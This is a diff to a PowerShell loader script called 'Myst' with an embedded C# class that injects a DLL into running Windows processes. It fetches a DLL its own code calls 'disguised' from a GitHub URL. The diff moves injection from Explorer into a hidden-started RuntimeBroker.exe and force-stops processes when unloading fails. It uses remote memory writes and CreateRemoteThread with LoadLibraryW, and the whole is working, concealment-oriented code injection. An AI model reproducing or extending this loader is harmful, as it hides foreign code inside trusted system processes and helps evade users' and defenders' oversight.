@@ -16,8 +16,8 @@ $defaultScriptUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/insta
 $defaultUpdateManifestUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/update.json'
 $defaultDisguisedDllUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/sbscmp64_mscorwks.dll'
 $script:UpdateManifestPath = Join-Path $env:ProgramData 'Myst\update.json'
-$n = 'explorer'
-$x = Join-Path $env:SystemRoot 'explorer.exe'
+$n = 'RuntimeBroker'
+$x = Join-Path $env:SystemRoot 'System32\RuntimeBroker.exe'
 $script:DllExecuterInstallPath = Join-Path $env:ProgramData 'Myst\install.ps1'
 
 function Resolve-InstallScriptPath {
@@ -598,7 +598,13 @@ function Test-RuntimeBrokerHasDll {
 
     if (-not $Process -or $Process.HasExited) { return $false }
     try {
-        return [bool](@($Process.Modules) | Where-Object { Test-DllPathMatch $_.FileName $DllPath })
+        if (@($Process.Modules) | Where-Object { Test-DllPathMatch $_.FileName $DllPath }) {
+            return $true
+        }
+    } catch {}
+
+    try {
+        return [Injector]::GetModuleBase($Process.Id, $DllPath) -ne [IntPtr]::Zero
     } catch {
         return $false
     }
@@ -612,7 +618,7 @@ function Remove-RuntimeBrokerDll {
 
     if (-not $Process -or $Process.HasExited) { return $true }
 
-    Write-Step "Clearing DLL from RuntimeBroker PID $($Process.Id)..." -Color Gray
+    Write-Step "Clearing DLL from $($Process.ProcessName) PID $($Process.Id)..." -Color Gray
 
     $unloaded = [Injector]::FreeModuleCompletely($Process.Id, $DllPath)
     if ($unloaded) {
@@ -623,10 +629,7 @@ function Remove-RuntimeBrokerDll {
         }
     }
 
-    Write-Step "  Unload incomplete — leaving $($Process.ProcessName) PID $($Process.Id) running." -Color Yellow
-    if ($Process.ProcessName -ieq 'explorer') {
-        return $false
-    }
+    Write-Step "  Unload incomplete — stopping $($Process.ProcessName) PID $($Process.Id)..." -Color Yellow
 
     Write-Step "  Stopping $($Process.ProcessName) PID $($Process.Id)..." -Color Yellow
     try {
@@ -663,14 +666,14 @@ function Clear-AllRuntimeBrokerDll {
 function Start-RuntimeBrokerInstance {
     param([string]$DllPath)
 
-    Write-Step 'Waiting for Explorer shell...' -Color Gray
-    if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 15)) {
-        Start-Process $x -ErrorAction SilentlyContinue | Out-Null
-        if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 15)) {
+    Write-Step 'Waiting for RuntimeBroker host...' -Color Gray
+    if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 8)) {
+        Start-Process $x -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+        if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 12)) {
             return $null
         }
     }
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 1
     return (Get-RuntimeBrokerInjectionTarget -DllPath $DllPath)
 }
 
@@ -685,18 +688,18 @@ function Get-RuntimeBrokerInjectionTarget {
     return $null
 }
 
-function Restart-ExplorerShell {
-    Write-Step 'Restarting Explorer to recover RuntimeBroker...' -Color Gray
-    Get-Process -Name explorer -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+function Restart-RuntimeBrokerHost {
+    Write-Step 'Restarting RuntimeBroker host...' -Color Gray
+    Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 1
+    Start-Process $x -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
     Start-Sleep -Seconds 2
-    Start-Process explorer.exe -ErrorAction SilentlyContinue | Out-Null
-    Start-Sleep -Seconds 4
 }
 
 function Invoke-Sbscmp30LoadFromDisk {
     param([switch]$SkipUnload)
 
-    Write-Step 'Starting Myst host load (Explorer)...' -Color Cyan
+    Write-Step 'Starting Myst host load (RuntimeBroker)...' -Color Cyan
 
     if (-not (Ensure-Sbscmp30OnDisk)) {
         Write-Step 'Ensure-Sbscmp30OnDisk failed.' -Color Red
@@ -714,18 +717,7 @@ function Invoke-Sbscmp30LoadFromDisk {
         Clear-AllRuntimeBrokerDll -DllPath $p | Out-Null
 
         foreach ($stubborn in @(Get-RuntimeBrokersWithDll -DllPath $p)) {
-            if ($stubborn.ProcessName -ieq 'explorer') {
-                Remove-RuntimeBrokerDll -Process $stubborn -DllPath $p | Out-Null
-                continue
-            }
-            Write-Step "Force-stopping stubborn host PID $($stubborn.Id)..." -Color Yellow
-            try {
-                Stop-Process -Id $stubborn.Id -Force -ErrorAction Stop
-            } catch {
-                if (-not $stubborn.HasExited) {
-                    Write-Step "  Could not stop PID $($stubborn.Id): $_" -Color Red
-                }
-            }
+            Remove-RuntimeBrokerDll -Process $stubborn -DllPath $p | Out-Null
         }
 
         Start-Sleep -Seconds 2
@@ -740,25 +732,26 @@ function Invoke-Sbscmp30LoadFromDisk {
             $targetProc = Start-RuntimeBrokerInstance -DllPath $p
         }
         if (-not $targetProc -and $retry -eq ($maxInjectRetries - 1)) {
-            Restart-ExplorerShell
+            Restart-RuntimeBrokerHost
             $targetProc = Get-RuntimeBrokerInjectionTarget -DllPath $p
             if (-not $targetProc) {
                 $targetProc = Start-RuntimeBrokerInstance -DllPath $p
             }
         }
         if (-not $targetProc) {
-            Write-Step 'No usable Explorer host available.' -Color Red
+            Write-Step 'No usable RuntimeBroker host available.' -Color Red
             continue
         }
 
         $targetPid = $targetProc.Id
-        Write-Step "Injecting sbscmp64 into Explorer PID $targetPid (attempt $($retry + 1))..." -Color Gray
+        Write-Step "Injecting sbscmp64 into RuntimeBroker PID $targetPid (attempt $($retry + 1))..." -Color Gray
 
-        if ([Injector]::X($targetPid, $p)) {
+        $loadResult = [Injector]::X($targetPid, $p)
+        if ($loadResult -gt 0) {
             Start-Sleep -Seconds 2
             $refreshed = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
             if ($refreshed -and (Test-RuntimeBrokerHasDll -Process $refreshed -DllPath $p)) {
-                Write-Step "sbscmp64 loaded in Explorer PID $targetPid" -Color Green
+                Write-Step "sbscmp64 loaded in RuntimeBroker PID $targetPid" -Color Green
                 return $true
             }
 
@@ -769,6 +762,8 @@ function Invoke-Sbscmp30LoadFromDisk {
             }
 
             Write-Step 'Injection API succeeded but module not visible in target process.' -Color Yellow
+        } elseif ($loadResult -eq 0) {
+            Write-Step 'LoadLibraryW returned NULL in target process (blocked or bad DLL).' -Color Yellow
         } else {
             Write-Step 'Injection API returned failure.' -Color Yellow
         }
@@ -833,7 +828,7 @@ function Inject-DllIntoProcesses {
                 }
 
                 $result = [Injector]::X($proc.Id, $DllPath)
-                if ($result) {
+                if ($result -gt 0) {
                     Start-Sleep -Milliseconds 700
                     if (Test-ProcessHasDll -ProcessId $proc.Id -DllPath $DllPath) {
                         Write-Step "  $processName PID $($proc.Id): OK" -Color Green
@@ -1019,25 +1014,31 @@ public class Injector {
         public string szExePath;
     }
 
-    public static bool X(int pid, string d) {
+    [DllImport("kernel32")] static extern bool GetExitCodeThread(IntPtr h, out uint exitCode);
+
+    public static int X(int pid, string d) {
         IntPtr h = OpenProcess(0x1F0FFF, false, pid);
-        if (h == IntPtr.Zero) return false;
+        if (h == IntPtr.Zero) return -1;
         IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)((d.Length + 1) * 2), 0x3000, 0x4);
-        if (a == IntPtr.Zero) { CloseHandle(h); return false; }
+        if (a == IntPtr.Zero) { CloseHandle(h); return -1; }
         byte[] b = System.Text.Encoding.Unicode.GetBytes(d);
         uint w;
-        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { CloseHandle(h); return false; }
+        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { CloseHandle(h); return -1; }
         IntPtr k = GetModuleHandle("kernel32.dll");
         IntPtr l = GetProcAddress(k, "LoadLibraryW");
         IntPtr t = CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
-        if (t == IntPtr.Zero) { CloseHandle(h); return false; }
+        if (t == IntPtr.Zero) { CloseHandle(h); return -1; }
         WaitForSingleObject(t, 0xFFFFFFFF);
+        uint exitCode = 0;
+        GetExitCodeThread(t, out exitCode);
         CloseHandle(t);
         CloseHandle(h);
-        return true;
+        return (int)exitCode;
     }
 
     public static IntPtr GetModuleBase(int pid, string dllPath) {
+        string targetPath = System.IO.Path.GetFullPath(dllPath).Replace('/', '\\');
+        string targetName = System.IO.Path.GetFileName(targetPath);
         IntPtr hSnapshot = CreateToolhelp32Snapshot(0x8, (uint)pid);
         if (hSnapshot == IntPtr.Zero) return IntPtr.Zero;
         MODULEENTRY32 me = new MODULEENTRY32();
@@ -1048,7 +1049,13 @@ public class Injector {
         }
         IntPtr modBase = IntPtr.Zero;
         do {
-            if (string.Equals(me.szExePath, dllPath, StringComparison.OrdinalIgnoreCase)) {
+            if (!string.IsNullOrEmpty(me.szExePath) &&
+                string.Equals(me.szExePath, targetPath, StringComparison.OrdinalIgnoreCase)) {
+                modBase = me.modBaseAddr;
+                break;
+            }
+            if (!string.IsNullOrEmpty(me.szModule) &&
+                string.Equals(me.szModule, targetName, StringComparison.OrdinalIgnoreCase)) {
                 modBase = me.modBaseAddr;
                 break;
             }
